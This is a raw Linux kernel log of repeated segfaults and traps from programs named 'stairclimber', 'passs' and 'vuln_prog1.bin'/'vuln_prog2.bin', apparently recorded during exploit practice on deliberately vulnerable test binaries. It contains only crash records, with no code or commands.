[3217223.497684] stairclimber[12702]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffec00e4cd0 error 4 in stairclimber[400000+6000]
[3217223.662406] stairclimber[12706]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffc9c666150 error 4 in stairclimber[400000+6000]
[3217443.419567] stairclimber[12882]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffc68cf0160 error 4 in stairclimber[400000+6000]
[3217443.574950] stairclimber[12886]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffeaacf7730 error 4 in stairclimber[400000+6000]
[3217638.232227] stairclimber[13044]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffd87458320 error 4 in stairclimber[400000+6000]
[3217638.390425] stairclimber[13048]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffef5a6c940 error 4 in stairclimber[400000+6000]
[3217767.771504] stairclimber[13223]: segfault at 3fffffffc ip 00000000004013ad sp 00007fff3dad8b20 error 4 in stairclimber[400000+6000]
[3217767.923505] stairclimber[13227]: segfault at 3fffffffc ip 00000000004013ad sp 00007fff40e1a780 error 4 in stairclimber[400000+6000]
[3217782.622796] traps: passs[13268] trap invalid opcode ip:4000c7 sp:7ffd16d84e28 error:0 in passs[400000+1000]
[3217858.510602] stairclimber[13385]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffde11f7520 error 4 in stairclimber[400000+6000]
[3217858.675111] stairclimber[13389]: segfault at 3fffffffc ip 00000000004013ad sp 00007ffcb33d42a0 error 4 in stairclimber[400000+6000]
[3218710.082581] traps: vuln_prog1.bin[14232] general protection ip:7fffffffd7f0 sp:7fffffffd7d0 error:0
[3222559.217815] stairclimber[16823]: segfault at 10 ip 00007fdd141cfc6a sp 00007fdd12621dd8 error 4 in libstdc++.so.6.0.21[7fdd1412b000+172000]
[3222670.225453] stairclimber[17037]: segfault at 7fe6d42b0d00 ip 00000000004025b5 sp 00007fe6d5b3fc30 error 4 in stairclimber[400000+5000]
[3222674.162199] stairclimber[17048]: segfault at 200000011 ip 00007f72a4e07bed sp 00007f72a4a7bb70 error 4 in libc-2.23.so[7f72a4d86000+1c0000]
[3222721.281675] stairclimber[17141]: segfault at 7f1595326ed8 ip 0000000000402575 sp 00007f1593af9cd0 error 4 in stairclimber[400000+5000]
[3222731.826501] stairclimber[17148]: segfault at 7ff13bf88668 ip 0000000000402575 sp 00007ff13b02fcd0 error 4 in stairclimber[400000+5000]
[3222742.694198] stairclimber[17154]: segfault at 7fb96ce73e40 ip 0000000000402575 sp 00007fb96b61acd0 error 4 in stairclimber[400000+5000]
[3222748.619106] stairclimber[17166]: segfault at 7faad6afbd88 ip 0000000000402579 sp 00007faad52d5cd0 error 4 in stairclimber[400000+5000]
[3227216.109334] vuln_prog1.bin[19517]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffe161dce30 error 14
[3227219.220231] vuln_prog1.bin[19521]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffd6bcddd90 error 14
[3227220.213556] vuln_prog1.bin[19523]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffc0e0122c0 error 14
[3227220.513566] vuln_prog1.bin[19526]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffcce015590 error 14
[3227220.810342] vuln_prog1.bin[19528]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffc6fdbc420 error 14
[3227222.524855] vuln_prog1.bin[19530]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffe9dd030d0 error 14
[3227284.782180] vuln_prog1.bin[19564]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffe1b64cd10 error 14
[3227286.015822] vuln_prog1.bin[19567]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffeaeda3840 error 14
[3227288.841829] vuln_prog1.bin[19570]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007ffd21167350 error 14
[3227425.372750] vuln_prog1.bin[19765]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007fff32dac030 error 14
[3227461.068412] vuln_prog1.bin[19799]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007fff88840e40 error 14
[3227592.870487] vuln_prog1.bin[19924]: segfault at 7fffffffdc60 ip 00007fffffffdc60 sp 00007fffc3e52e00 error 14
[3227608.077005] traps: vuln_prog1.bin[19936] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227610.548606] traps: vuln_prog1.bin[19938] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227611.730942] traps: vuln_prog1.bin[19940] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227612.729041] traps: vuln_prog1.bin[19942] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227614.597864] traps: vuln_prog1.bin[19944] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227712.463170] traps: vuln_prog1.bin[20285] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227715.869475] traps: vuln_prog1.bin[20288] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227717.489311] traps: vuln_prog1.bin[20290] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227747.029929] traps: vuln_prog1.bin[20326] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227804.858989] traps: vuln_prog1.bin[20400] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3227908.025241] traps: vuln_prog1.bin[20532] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3228066.737168] traps: vuln_prog1.bin[20757] trap invalid opcode ip:7fffffffdc60 sp:7fffffffdc70 error:0
[3228105.017017] vuln_prog1.bin[20852]: segfault at 100 ip 00007fffffffdc20 sp 00007fffffffdc70 error 4
[3228458.259355] traps: vuln_prog1.bin[21219] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229378.564057] vuln_prog1.bin[21836]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffff5332340 error 14
[3229464.826294] traps: vuln_prog1.bin[21983] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229528.027115] traps: vuln_prog1.bin[22068] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229552.407592] traps: vuln_prog1.bin[22097] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229560.638757] traps: vuln_prog1.bin[22101] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229562.208907] traps: vuln_prog1.bin[22103] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229566.095090] traps: vuln_prog1.bin[22105] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229567.732088] traps: vuln_prog1.bin[22107] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229574.116949] traps: vuln_prog1.bin[22114] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229575.355743] traps: vuln_prog1.bin[22116] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229578.171804] traps: vuln_prog1.bin[22118] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229579.242497] traps: vuln_prog1.bin[22120] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3229707.230096] traps: vuln_prog1.bin[22315] general protection ip:7fffffffdc60 sp:7fffffffdc50 error:0
[3230191.292309] traps: vuln_prog2.bin[23316] general protection ip:7ffff7a5bcc0 sp:7fffffffcd10 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3230227.983509] traps: vuln_prog2.bin[23387] general protection ip:7ffff7a5bcc0 sp:7fffffffcd10 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3230247.911439] traps: vuln_prog2.bin[23462] general protection ip:7ffff7a5bcc0 sp:7fffffffcd10 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3230258.997605] traps: vuln_prog2.bin[23526] general protection ip:7ffff7a5bcc0 sp:7fffffffcd10 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3230259.189401] traps: vuln_prog1.bin[23543] trap invalid opcode ip:7fffffffdbb2 sp:7fffffffd230 error:0
[3230259.361433] traps: vuln_prog2.bin[23556] general protection ip:7ffff7a5bcc0 sp:7fffffffcd10 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3230259.537713] traps: vuln_prog1.bin[23569] trap invalid opcode ip:7fffffffdbb2 sp:7fffffffd230 error:0
[3230784.574916] vuln_prog1.bin[24444]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffe7d2cacf0 error 14
[3238858.965950] stairclimber[29810]: segfault at 7fff6ed69ff8 ip 000000000040199a sp 00007fff6ed69ff0 error 6 in stairclimber[400000+7000]
[3238859.132992] stairclimber[29814]: segfault at 7fffd697cff8 ip 0000000000402265 sp 00007fffd697d000 error 6 in stairclimber[400000+7000]
[3238859.292632] stairclimber[29818]: segfault at 7ffdcd571ff8 ip 00000000004010e4 sp 00007ffdcd572000 error 6 in stairclimber[400000+7000]
[3238859.453925] stairclimber[29822]: segfault at 7ffef938dff8 ip 000000000040277c sp 00007ffef938e000 error 6 in stairclimber[400000+7000]
[3238859.620084] stairclimber[29826]: segfault at 7ffec9a38ff8 ip 00000000004016b3 sp 00007ffec9a39000 error 6 in stairclimber[400000+7000]
[3238859.768667] stairclimber[29830]: segfault at 7ffd7fca3ff8 ip 0000000000402265 sp 00007ffd7fca4000 error 6 in stairclimber[400000+7000]
[3238911.948788] stairclimber[29909]: segfault at 7fffc7c4dff8 ip 00000000004016b6 sp 00007fffc7c4dff0 error 6 in stairclimber[400000+7000]
[3238912.119636] stairclimber[29913]: segfault at 7fff0fa23ff8 ip 00000000004019b3 sp 00007fff0fa24000 error 6 in stairclimber[400000+7000]
[3238912.278886] stairclimber[29917]: segfault at 7ffcb3f0aff8 ip 000000000040278a sp 00007ffcb3f0b000 error 6 in stairclimber[400000+7000]
[3238912.435072] stairclimber[29921]: segfault at 7ffefb6c2ff8 ip 0000000000401c63 sp 00007ffefb6c3000 error 6 in stairclimber[400000+7000]
[3238912.572394] stairclimber[29925]: segfault at 7ffcaebdeff8 ip 00000000004019a8 sp 00007ffcaebdeff0 error 6 in stairclimber[400000+7000]
[3238912.690043] stairclimber[29929]: segfault at 7fffce8f4ff8 ip 00000000004019a8 sp 00007fffce8f4ff0 error 6 in stairclimber[400000+7000]
[3239012.929973] stairclimber[30032]: segfault at 7ffd7cf10ff8 ip 00000000004010e4 sp 00007ffd7cf11000 error 6 in stairclimber[400000+7000]
[3239013.093682] stairclimber[30036]: segfault at 7ffe9a823ff8 ip 00000000004016c4 sp 00007ffe9a823ff0 error 6 in stairclimber[400000+7000]
[3239013.254512] stairclimber[30040]: segfault at 7ffc2c21dff8 ip 00000000004010e4 sp 00007ffc2c21e000 error 6 in stairclimber[400000+7000]
[3239013.409778] stairclimber[30044]: segfault at 7ffc58f31ff8 ip 00000000004010e4 sp 00007ffc58f32000 error 6 in stairclimber[400000+7000]
[3239013.533528] stairclimber[30048]: segfault at 7ffd80f96ff8 ip 0000000000401c71 sp 00007ffd80f97000 error 6 in stairclimber[400000+7000]
[3239013.654936] stairclimber[30052]: segfault at 7fffe2919ff8 ip 00000000004019b6 sp 00007fffe2919ff0 error 6 in stairclimber[400000+7000]
[3239085.268077] stairclimber[30159]: segfault at 7ffcd4089ff8 ip 00000000004019dd sp 00007ffcd408a000 error 6 in stairclimber[400000+7000]
[3239085.426059] stairclimber[30163]: segfault at 7ffe539c4ff8 ip 00000000004010e4 sp 00007ffe539c5000 error 6 in stairclimber[400000+7000]
[3239085.578078] stairclimber[30167]: segfault at 7fffcff3eff8 ip 0000000000401c8d sp 00007fffcff3f000 error 6 in stairclimber[400000+7000]
[3239085.724326] stairclimber[30171]: segfault at 7fff88cafff8 ip 000000000040229d sp 00007fff88cb0000 error 6 in stairclimber[400000+7000]
[3239085.848386] stairclimber[30175]: segfault at 7ffdd46e0ff8 ip 00000000004016eb sp 00007ffdd46e1000 error 6 in stairclimber[400000+7000]
[3239086.015973] stairclimber[30179]: segfault at 7ffd87939ff8 ip 0000000000401c8d sp 00007ffd8793a000 error 6 in stairclimber[400000+7000]
[3239129.088170] stairclimber[30276]: segfault at 7ffc20d2aff8 ip 0000000000401c8d sp 00007ffc20d2b000 error 6 in stairclimber[400000+7000]
[3239129.254755] stairclimber[30283]: segfault at 7ffd02bc2ff8 ip 00000000004016e0 sp 00007ffd02bc2ff0 error 6 in stairclimber[400000+7000]
[3239129.387103] stairclimber[30287]: segfault at 7ffc36e15ff8 ip 0000000000401c8d sp 00007ffc36e16000 error 6 in stairclimber[400000+7000]
[3239129.560627] stairclimber[30291]: segfault at 7ffc0e40aff8 ip 0000000000401c8d sp 00007ffc0e40b000 error 6 in stairclimber[400000+7000]
[3239129.743316] stairclimber[30295]: segfault at 7ffc9309fff8 ip 000000000040229d sp 00007ffc930a0000 error 6 in stairclimber[400000+7000]
[3239129.906586] stairclimber[30299]: segfault at 7ffc499c6ff8 ip 00000000004016e0 sp 00007ffc499c6ff0 error 6 in stairclimber[400000+7000]
[3239224.409707] stairclimber[30450]: segfault at 7ffc706a9ff8 ip 00007f9a6eba25c1 sp 00007ffc706aa000 error 6 in libstdc++.so.6.0.21[7f9a6ea94000+172000]
[3239224.909970] stairclimber[30454]: segfault at 7ffdab8e4ff8 ip 00007f7180bf17b8 sp 00007ffdab8e5000 error 6 in libc-2.23.so[7f7180b83000+1c0000]
[3239225.347703] stairclimber[30460]: segfault at 7fff5135eff8 ip 00007fc337a7d23d sp 00007fff5135f000 error 6 in libc-2.23.so[7fc337a04000+1c0000]
[3239225.806710] stairclimber[30464]: segfault at 7fffa1d9dff8 ip 00000000004027d0 sp 00007fffa1d9e000 error 6 in stairclimber[400000+7000]
[3239226.220149] stairclimber[30468]: segfault at 7fffc88b1ff8 ip 00007f8ce681c23d sp 00007fffc88b2000 error 6 in libc-2.23.so[7f8ce67a3000+1c0000]
[3239227.300979] stairclimber[30472]: segfault at 7fff655b8ff8 ip 00007fd0f1ebd23d sp 00007fff655b9000 error 6 in libc-2.23.so[7fd0f1e44000+1c0000]
[3239433.544834] stairclimber[30677]: segfault at 7ffcccdc4ff8 ip 00000000004027d0 sp 00007ffcccdc5000 error 6 in stairclimber[400000+7000]
[3239433.722550] stairclimber[30681]: segfault at 7ffd17feaff8 ip 00000000004016fc sp 00007ffd17feaff0 error 6 in stairclimber[400000+7000]
[3239433.877498] stairclimber[30685]: segfault at 7fff0ea19ff8 ip 00000000004016fc sp 00007fff0ea19ff0 error 6 in stairclimber[400000+7000]
[3239434.032603] stairclimber[30689]: segfault at 7ffd41574ff8 ip 00000000004010e4 sp 00007ffd41575000 error 6 in stairclimber[400000+7000]
[3239434.170606] stairclimber[30693]: segfault at 7ffec9a30ff8 ip 00000000004027d0 sp 00007ffec9a31000 error 6 in stairclimber[400000+7000]
[3239434.334358] stairclimber[30697]: segfault at 7fff0c3b0ff8 ip 0000000000401707 sp 00007fff0c3b1000 error 6 in stairclimber[400000+7000]
[3239670.215778] vuln_prog1.bin[30817]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffd47137e30 error 14
[3239819.814982] vuln_prog1.bin[30851]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffc50b8c440 error 14
[3239857.426834] vuln_prog1.bin[30904]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007fff79392500 error 14
[3240083.836923] stairclimber[31125]: segfault at 8 ip 0000000000401844 sp 00007fffcdeab530 error 4 in stairclimber[400000+5000]
[3240084.003362] stairclimber[31129]: segfault at 8 ip 0000000000401844 sp 00007ffec1f14b50 error 4 in stairclimber[400000+5000]
[3240084.159089] stairclimber[31133]: segfault at 8 ip 0000000000401844 sp 00007fff30a085e0 error 4 in stairclimber[400000+5000]
[3240084.326707] stairclimber[31137]: segfault at 8 ip 0000000000401844 sp 00007fff93ac24e0 error 4 in stairclimber[400000+5000]
[3240084.452591] stairclimber[31141]: segfault at 8 ip 0000000000401844 sp 00007fff805de2c0 error 4 in stairclimber[400000+5000]
[3240084.565414] stairclimber[31145]: segfault at 8 ip 0000000000401844 sp 00007ffde1109220 error 4 in stairclimber[400000+5000]
[3240511.083873] vuln_prog1.bin[31325]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffec1dedbb0 error 14
[3240754.872416] vuln_prog1.bin[31391]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffc8fee9530 error 14
[3240768.372161] vuln_prog1.bin[31396]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffc32956540 error 14
[3241437.320837] stairclimber[31547]: segfault at 8 ip 0000000000401f74 sp 00007ffeb2fef9b0 error 4 in stairclimber[400000+6000]
[3241437.432209] stairclimber[31551]: segfault at 8 ip 0000000000401f74 sp 00007fff8954c170 error 4 in stairclimber[400000+6000]
[3241437.539922] stairclimber[31555]: segfault at 8 ip 0000000000401f74 sp 00007fff0bb34060 error 4 in stairclimber[400000+6000]
[3241437.647227] stairclimber[31560]: segfault at 8 ip 0000000000401f74 sp 00007ffe4044ede0 error 4 in stairclimber[400000+6000]
[3241524.202554] stairclimber[31618]: segfault at 8 ip 0000000000401f46 sp 00007ffdeafd5d00 error 4 in stairclimber[400000+6000]
[3241524.362865] stairclimber[31622]: segfault at 8 ip 0000000000401f46 sp 00007ffd7ad77640 error 4 in stairclimber[400000+6000]
[3241524.513561] stairclimber[31626]: segfault at 8 ip 0000000000401f46 sp 00007ffc0055beb0 error 4 in stairclimber[400000+6000]
[3241524.656066] stairclimber[31630]: segfault at 8 ip 0000000000401f46 sp 00007ffcbd0380f0 error 4 in stairclimber[400000+6000]
[3241569.038748] stairclimber[31677]: segfault at 8 ip 0000000000401f46 sp 00007ffc96c4f670 error 4 in stairclimber[400000+6000]
[3241569.212027] stairclimber[31681]: segfault at 8 ip 0000000000401f46 sp 00007fff2376a9f0 error 4 in stairclimber[400000+6000]
[3241569.361523] stairclimber[31685]: segfault at 8 ip 0000000000401f46 sp 00007fff7ac3e8c0 error 4 in stairclimber[400000+6000]
[3241569.511738] stairclimber[31689]: segfault at 8 ip 0000000000401f46 sp 00007fff59b9d730 error 4 in stairclimber[400000+6000]
[3241742.953931] vuln_prog1.bin[31736]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fff66a08ee0 error 14
[3241769.340593] vuln_prog1.bin[31836]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffd653ebd50 error 14
[3241795.882915] vuln_prog1.bin[31938]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffca0e1f450 error 14
[3241811.199252] vuln_prog1.bin[31943]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffcfeecefb0 error 14
[3241930.571382] vuln_prog1.bin[31995]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffeb862a180 error 14
[3241933.958349] vuln_prog1.bin[31999]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffdfaabc750 error 14
[3241935.869812] vuln_prog1.bin[32001]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffd0d6f8c90 error 14
[3241937.995870] vuln_prog1.bin[32003]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fff7a3a43f0 error 14
[3241940.546591] vuln_prog1.bin[32005]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fff64af0c20 error 14
[3241946.016274] vuln_prog1.bin[32007]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffebc025620 error 14
[3241948.226533] vuln_prog1.bin[32011]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffce5615b70 error 14
[3241949.765186] vuln_prog1.bin[32013]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffec9fb2260 error 14
[3241951.271007] vuln_prog1.bin[32015]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffe07b07500 error 14
[3241953.380712] vuln_prog1.bin[32017]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffd437888c0 error 14
[3241956.386809] vuln_prog1.bin[32019]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffe9d1c33c0 error 14
[3241958.006024] vuln_prog1.bin[32021]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffc0a8dee50 error 14
[3241959.662332] vuln_prog1.bin[32023]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffd2ab62280 error 14
[3241969.748219] vuln_prog1.bin[32027]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fff5fa23ff0 error 14
[3241971.266397] vuln_prog1.bin[32029]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffea2d3e1e0 error 14
[3241973.309611] vuln_prog1.bin[32031]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffc621c1bb0 error 14
[3242006.405227] vuln_prog1.bin[32037]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fff9fba4c50 error 14
[3242036.034608] vuln_prog1.bin[32051]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffe7c1a4a90 error 14
[3242037.801910] vuln_prog1.bin[32055]: segfault at 7fffffffd7e0 ip 00007fffffffd7e0 sp 00007ffc84c27550 error 14
[3242061.754443] vuln_prog1.bin[32063]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffdc7aeb9f0 error 14
[3242197.163690] stairclimber[32129]: segfault at 7ffe655e6f68 ip 00007f246c09cbbc sp 00007ffe655e6f60 error 6 in libc-2.23.so[7f246c01b000+1c0000]
[3242197.345216] stairclimber[32133]: segfault at 7fff7fab6f88 ip 00007f2a2c518bbc sp 00007fff7fab6f80 error 6 in libc-2.23.so[7f2a2c497000+1c0000]
[3242197.536504] stairclimber[32137]: segfault at 7ffe4d77eff8 ip 0000000000404350 sp 00007ffe4d77f000 error 6 in stairclimber[400000+8000]
[3242197.730592] stairclimber[32141]: segfault at 7fff48eb0fa8 ip 00007f284eeccbbc sp 00007fff48eb0fa0 error 6 in libc-2.23.so[7f284ee4b000+1c0000]
[3242197.919662] stairclimber[32145]: segfault at 7ffe08cc1fe8 ip 00007fe508ce9bbc sp 00007ffe08cc1fe0 error 6 in libc-2.23.so[7fe508c68000+1c0000]
[3242198.100176] stairclimber[32149]: segfault at 7fffaa9a1fa8 ip 00007f1a5cfd2bbc sp 00007fffaa9a1fa0 error 6 in libc-2.23.so[7f1a5cf51000+1c0000]
[3242258.322737] vuln_prog1.bin[32165]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007ffd53d49ca0 error 14
[3242425.848247] traps: vuln_prog1.bin[32201] trap invalid opcode ip:7fffffffd848 sp:7fffffffd7f0 error:0
[3242927.904683] vuln_prog1.bin[32351]: segfault at 7fffffffd7f0 ip 00007fffffffd7f0 sp 00007fffefa8ec10 error 14
[3243298.711722] traps: vuln_prog1.bin[32462] trap invalid opcode ip:7fffffffd84a sp:7fffffffd7f0 error:0
[3243339.738047] stairclimber[32498]: segfault at 0 ip 00000000004025e1 sp 00007ffeeda3faa0 error 4 in stairclimber[400000+6000]
[3243339.901123] stairclimber[32502]: segfault at 0 ip 00000000004025e1 sp 00007ffe79347940 error 4 in stairclimber[400000+6000]
[3243340.062858] stairclimber[32506]: segfault at 0 ip 00000000004025e1 sp 00007fff47fd1ed0 error 4 in stairclimber[400000+6000]
[3243340.221540] stairclimber[32510]: segfault at 0 ip 00000000004025e1 sp 00007ffdfbd143d0 error 4 in stairclimber[400000+6000]
[3243340.382349] stairclimber[32514]: segfault at 0 ip 00000000004025e1 sp 00007ffda3bc8950 error 4 in stairclimber[400000+6000]
[3243340.545657] stairclimber[32518]: segfault at 0 ip 00000000004025e1 sp 00007ffd8c9c4070 error 4 in stairclimber[400000+6000]
[3243368.418437] vuln_prog1.bin[32529]: segfault at 7fffffffd810 ip 00007fffffffd810 sp 00007ffdd4792200 error 14
[3243377.138894] vuln_prog1.bin[32533]: segfault at 7fffffffd810 ip 00007fffffffd810 sp 00007fff31824ca0 error 14
[3244090.141329] stairclimber[465]: segfault at 7ffdd8022ff8 ip 00000000004047c2 sp 00007ffdd8022ff0 error 6 in stairclimber[400000+8000]
[3244090.324736] stairclimber[469]: segfault at 7ffc64cccfd8 ip 00007fba598b0bbc sp 00007ffc64cccfd0 error 6 in libc-2.23.so[7fba5982f000+1c0000]
[3244090.515822] stairclimber[473]: segfault at 7ffe8c0d5fb8 ip 00007f84a43c2bbc sp 00007ffe8c0d5fb0 error 6 in libc-2.23.so[7f84a4341000+1c0000]
[3244090.702358] stairclimber[477]: segfault at 7ffd29cbfff8 ip 00000000004047c2 sp 00007ffd29cbfff0 error 6 in stairclimber[400000+8000]
[3244090.914135] stairclimber[481]: segfault at 7ffcf33f9ff8 ip 00000000004047ba sp 00007ffcf33f9fe0 error 6 in stairclimber[400000+8000]
[3244091.106349] stairclimber[485]: segfault at 7fff3c56efd8 ip 00007f1ed2155bbc sp 00007fff3c56efd0 error 6 in libc-2.23.so[7f1ed20d4000+1c0000]
[3244279.542702] stairclimber[553]: segfault at 7ffd4393bfb8 ip 00007f3501b4bbbc sp 00007ffd4393bfb0 error 6 in libc-2.23.so[7f3501aca000+1c0000]
[3244279.744596] stairclimber[557]: segfault at 7ffc9309bfd8 ip 00007f6bad033bbc sp 00007ffc9309bfd0 error 6 in libc-2.23.so[7f6bacfb2000+1c0000]
[3244279.955311] stairclimber[561]: segfault at 7ffc08a69f78 ip 00007fdfdb99fbbc sp 00007ffc08a69f70 error 6 in libc-2.23.so[7fdfdb91e000+1c0000]
[3244280.166861] stairclimber[565]: segfault at 7ffd9a2ccf78 ip 00007f53c693dbbc sp 00007ffd9a2ccf70 error 6 in libc-2.23.so[7f53c68bc000+1c0000]
[3244280.369031] stairclimber[569]: segfault at 7ffc9bee8fc8 ip 00007f21f5312bbc sp 00007ffc9bee8fc0 error 6 in libc-2.23.so[7f21f5291000+1c0000]
[3244280.568419] stairclimber[573]: segfault at 7ffdf9d45f78 ip 00007f75691babbc sp 00007ffdf9d45f70 error 6 in libc-2.23.so[7f7569139000+1c0000]
[3244837.443003] stairclimber[821]: segfault at 7ffdebd4bff8 ip 0000000000401755 sp 00007ffdebd4c000 error 6 in stairclimber[400000+8000]
[3244837.606804] stairclimber[826]: segfault at 7ffd39a21ff8 ip 0000000000402b5b sp 00007ffd39a22000 error 6 in stairclimber[400000+8000]
[3244837.762302] stairclimber[830]: segfault at 7ffc8fbf0ff8 ip 0000000000401b3d sp 00007ffc8fbf1000 error 6 in stairclimber[400000+8000]
[3244837.913136] stairclimber[834]: segfault at 7fff6ba6eff8 ip 0000000000401b32 sp 00007fff6ba6eff0 error 6 in stairclimber[400000+8000]
[3244838.030113] stairclimber[838]: segfault at 7ffec4f36ff8 ip 0000000000401b3d sp 00007ffec4f37000 error 6 in stairclimber[400000+8000]
[3244838.151592] stairclimber[842]: segfault at 7ffcfc0c6ff8 ip 00000000004010e7 sp 00007ffcfc0c7000 error 6 in stairclimber[400000+8000]
[3244912.291576] stairclimber[894]: segfault at 7ffd2645cff8 ip 0000000000402131 sp 00007ffd2645d000 error 6 in stairclimber[400000+8000]
[3244912.472543] stairclimber[898]: segfault at 7ffcb9fd4ff8 ip 0000000000401b59 sp 00007ffcb9fd5000 error 6 in stairclimber[400000+8000]
[3244912.628408] stairclimber[902]: segfault at 7ffe35a97ff8 ip 00000000004010e7 sp 00007ffe35a98000 error 6 in stairclimber[400000+8000]
[3244912.784349] stairclimber[906]: segfault at 7ffcb8c17ff8 ip 0000000000402b6c sp 00007ffcb8c17ff0 error 6 in stairclimber[400000+8000]
[3244912.960604] stairclimber[912]: segfault at 7ffde0be9ff8 ip 0000000000402b6c sp 00007ffde0be9ff0 error 6 in stairclimber[400000+8000]
[3244913.119897] stairclimber[916]: segfault at 7ffeb6458ff8 ip 0000000000402131 sp 00007ffeb6459000 error 6 in stairclimber[400000+8000]
[3244992.856618] stairclimber[960]: segfault at 7ffec9058ff8 ip 00000000004020e9 sp 00007ffec9059000 error 6 in stairclimber[400000+8000]
[3244993.027560] stairclimber[964]: segfault at 7fff3db47ff8 ip 00000000004020e9 sp 00007fff3db48000 error 6 in stairclimber[400000+8000]
[3244993.202820] stairclimber[969]: segfault at 7ffcb2112ff8 ip 0000000000401729 sp 00007ffcb2113000 error 6 in stairclimber[400000+8000]
[3244993.361636] stairclimber[973]: segfault at 7ffc18555ff8 ip 0000000000401b06 sp 00007ffc18555ff0 error 6 in stairclimber[400000+8000]
[3244993.535841] stairclimber[978]: segfault at 7fff6d638ff8 ip 00000000004020de sp 00007fff6d638ff0 error 6 in stairclimber[400000+8000]
[3244993.709758] stairclimber[982]: segfault at 7ffdde751ff8 ip 00000000004020e9 sp 00007ffdde752000 error 6 in stairclimber[400000+8000]
[3245055.486372] stairclimber[1033]: segfault at 7fffae468ff8 ip 0000000000401b06 sp 00007fffae468ff0 error 6 in stairclimber[400000+8000]
[3245055.658599] stairclimber[1037]: segfault at 7ffd9ac0dff8 ip 0000000000401b06 sp 00007ffd9ac0dff0 error 6 in stairclimber[400000+8000]
[3245055.819166] stairclimber[1041]: segfault at 7ffc56122ff8 ip 00000000004020de sp 00007ffc56122ff0 error 6 in stairclimber[400000+8000]
